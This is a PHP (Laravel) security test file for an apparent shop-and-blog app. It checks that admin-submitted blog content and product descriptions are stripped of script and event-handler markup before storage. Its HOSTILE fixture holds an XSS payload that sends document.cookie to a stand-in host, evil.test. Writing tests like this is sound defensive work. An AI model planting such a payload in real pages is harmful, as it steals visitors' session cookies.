<?php

namespace Tests\Feature\Security;

use App\Models\BlogPost;
use App\Models\Category;
use App\Models\Product;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Blog `content` and product `description` are rendered raw on public pages —
 * Blogs/Show.jsx and Products/Show.jsx both use dangerouslySetInnerHTML — and
 * were validated as nothing more than `string`.
 *
 * They are cleaned on the way in rather than on the way out, so the database
 * never holds the hostile markup and a template that forgets to escape cannot
 * bring it back.
 */
class RichContentSanitisationTest extends TestCase
{
    use RefreshDatabase;

    private const HOSTILE = '<p>Read this</p><script>fetch("//evil.test?c="+document.cookie)</script>'
        .'<img src=x onerror="alert(1)">';

    private function admin(): User
    {
        return User::factory()->create(['role' => 'admin']);
    }

    private function blogPayload(array $overrides = []): array
    {
        return array_merge([
            'title' => 'Choosing a GPU',
            'category' => 'Guides',
            'excerpt' => 'How to pick one.',
            'content' => self::HOSTILE,
            'image_path' => '/images/blog.jpg',
            'author_name' => 'Editor',
            'read_time' => '5 min',
            'is_published' => true,
        ], $overrides);
    }

    public function test_a_blog_post_is_stored_without_script(): void
    {
        $this->actingAs($this->admin())
            ->postJson('/api/admin/blogs', $this->blogPayload())
            ->assertStatus(201);

        $stored = BlogPost::first()->content;

        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('onerror', $stored);
        $this->assertStringContainsString('Read this', $stored);
    }

    public function test_editing_a_blog_post_cleans_it_too(): void
    {
        $admin = $this->admin();

        $this->actingAs($admin)
            ->postJson('/api/admin/blogs', $this->blogPayload(['content' => '<p>Clean</p>']))
            ->assertStatus(201);

        $blog = BlogPost::first();

        $this->actingAs($admin)
            ->putJson("/api/admin/blogs/{$blog->id}", $this->blogPayload())
            ->assertStatus(200);

        $this->assertStringNotContainsString('<script', $blog->fresh()->content);
    }

    public function test_a_product_description_is_stored_without_script(): void
    {
        $category = Category::create(['name' => 'CPU', 'slug' => 'cpu', 'is_active' => true]);

        $this->actingAs($this->admin())
            ->postJson('/api/admin/products', [
                'category_id' => $category->id,
                'name' => 'Ryzen 9',
                'price' => 50000,
                'stock_quantity' => 2,
                'description' => self::HOSTILE,
            ])->assertStatus(201);

        $stored = Product::first()->description;

        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('onerror', $stored);
    }

    public function test_editing_a_product_description_cleans_it_too(): void
    {
        $category = Category::create(['name' => 'CPU', 'slug' => 'cpu', 'is_active' => true]);
        $product = Product::create([
            'category_id' => $category->id,
            'name' => 'Ryzen 9',
            'slug' => 'ryzen-9',
            'price' => 50000,
            'stock_quantity' => 0,
            'is_active' => true,
        ]);

        $this->actingAs($this->admin())
            ->patchJson("/api/admin/products/{$product->id}", ['description' => self::HOSTILE])
            ->assertStatus(200);

        $this->assertStringNotContainsString('<script', $product->fresh()->description);
    }

    /** A description that is not being edited must not be disturbed. */
    public function test_an_untouched_description_is_left_alone(): void
    {
        $category = Category::create(['name' => 'CPU', 'slug' => 'cpu', 'is_active' => true]);
        $product = Product::create([
            'category_id' => $category->id,
            'name' => 'Ryzen 9',
            'slug' => 'ryzen-9',
            'price' => 50000,
            'stock_quantity' => 0,
            'is_active' => true,
            'description' => '<p>Original copy</p>',
        ]);

        $this->actingAs($this->admin())
            ->patchJson("/api/admin/products/{$product->id}", ['price' => 51000])
            ->assertStatus(200);

        $this->assertSame('<p>Original copy</p>', $product->fresh()->description);
    }
}
